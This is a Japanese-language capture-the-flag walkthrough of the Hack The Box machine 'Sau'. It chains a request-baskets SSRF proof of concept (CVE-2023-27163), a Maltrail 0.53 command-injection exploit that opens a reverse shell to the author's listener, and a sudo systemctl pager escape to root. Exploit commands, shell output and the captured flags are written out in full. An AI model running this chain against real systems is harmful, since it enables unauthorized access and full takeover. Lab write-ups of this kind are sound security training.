https://app.hackthebox.com/machines/Sau

## STEP 1
```sh
└─$ nmap -n -Pn -p- -sV 10.129.229.26                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 09:15 EDT
Nmap scan report for 10.129.229.26
Host is up (0.66s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   filtered http
8338/tcp filtered unknown
55555/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=6/30%Time=68628E34%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2030\x20Jun\x20
SF:2025\x2013:16:34\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2030\x20Jun\x20
SF:2025\x2013:16:38\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Mon,\x2030\x20Jun\x202025\x2
SF:013:17:03\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1000 seconds
```


## STEP 2
55555番にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_01.png" width="100%" height="100%">  
`request-baskets`バージョン1.2.1には、CVE-2023-27163（SSRFの脆弱性）が存在する  
[PoC](https://github.com/entr0pie/CVE-2023-27163/tree/main)では、ターゲットで内部向けのポートへフォワーディングできる  
nmapの結果では80番がフィルタされていたのでPoCで確認してみる
```sh
└─$ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh  
--2025-06-30 09:12:20--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1669 (1.6K) [text/plain]
Saving to: ‘CVE-2023-27163.sh’

CVE-2023-27163.sh                                          100%[========================================================================================================================================>]   1.63K  --.-KB/s    in 0s      

2025-06-30 09:12:21 (24.1 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]


└─$ ./CVE-2023-27163.sh       
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

Usage: CVE-2023-27163.sh <URL> <TARGET>

This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,
which will act as a proxy to other services and servers.

Arguments:
 URL            main path (/) of the server (eg. http://127.0.0.1:5000/)
 TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)

More info at https://github.com/entr0pie/CVE-2023-27163.


└─$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "mtpggm" proxy basket...
> Basket created!
> Accessing http://10.129.229.26:55555/mtpggm now makes the server request to http://127.0.0.1:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"7QE7vU41tjWjcv3ki3lGO01uqgHnFUkunvY5jRfjXWzB"}
```
PoCで作成されたurlにアクセス、80番へのアクセスが成功した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_02.png" width="50%" height="50%">


## STEP 3
80番で動作している、Maltrail 0.53 にもrceの脆弱性がある  
[PoC](https://github.com/spookier/Maltrail-v0.53-Exploit)を確認すると、hxxp://x.x.x.x/loginに脆弱性があるっぽい  
ここでPoCのtarget_URLの部分を変更する（request basketsで生成したurlを使用するため）
```python
target_URL = sys.argv[3] + "/login"
↓
target_URL = sys.argv[3]
```
ここでPoCの通信を「hxxp://127.0.0.1/login」にフォワーディングするために、先程の「request baskets」を利用しPoC実行
```sh
└─$ ./CVE-2023-27163.sh http://10.129.200.37:55555 http://127.0.0.1:80/login
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "tcrcqh" proxy basket...
> Basket created!
> Accessing http://10.129.200.37:55555/tcrcqh now makes the server request to http://127.0.0.1:80/login.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"8fGpaB2m8QH7NW0ne_6Rxd-l0B8LHvFtRjMoVpTutd5r"}


└─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
--2025-07-02 02:09:48--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
Proxy request sent, awaiting response... 200 OK
Length: 2200 (2.1K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      

2025-07-02 02:09:49 (25.3 MB/s) - ‘exploit.py’ saved [2200/2200]


└─$ python3.13 exploit.py 10.10.16.4 4444 http://10.129.200.37:55555/tcrcqh
Running exploit on http://10.129.200.37:55555/tcrcqh
^C 
```
リバースシェルゲット！ユーザフラグゲット
```sh
└─$ rlwrap nc -lnvp 4444                   
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.200.37] 44166
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)


$ cat /home/puma/user.txt
cat /home/puma/user.txt
87961d03dd608aa3d7389921a468e5fd
```


## STEP 4
パスワードなしで、sudoでroot権限で「/usr/bin/systemctl status trail.service」が実行できるらしい
```sh
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
systemctlコマンドで画面出力が`less`コマンドに渡される
[リンク](https://gtfobins.github.io/gtfobins/systemctl/#sudo)を確認すると、lessコマンド中にシェルを開けることができ、ルートフラグゲット！
```sh
$ sudo systemctl status trail.service
sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Wed 2025-07-02 05:55:10 UTC; 39min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 879 (python3)
      Tasks: 10 (limit: 4662)
     Memory: 22.5M
     CGroup: /system.slice/trail.service
             ├─ 879 /usr/bin/python3 server.py
             ├─1095 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed p>
             ├─1096 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed p>
             ├─1099 sh
             ├─1100 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1101 /bin/sh
             ├─1108 sudo systemctl status trail.service
             ├─1110 systemctl status trail.service
             └─1111 pager

Jul 02 05:55:10 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
Jul 02 06:09:29 sau maltrail[976]: Failed password for None from 127.0.0.1 port>
Jul 02 06:33:08 sau sudo[1107]:     puma : TTY=pts/0 ; PWD=/opt/maltrail ; USER>
Jul 02 06:34:16 sau sudo[1108]:     puma : TTY=pts/0 ; PWD=/opt/maltrail ; USER>
lines 1-23!sh
!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)


# cat /root/root.txt
cat /root/root.txt
961dc7484c3ca254d7a9d79dda1f41cb
```
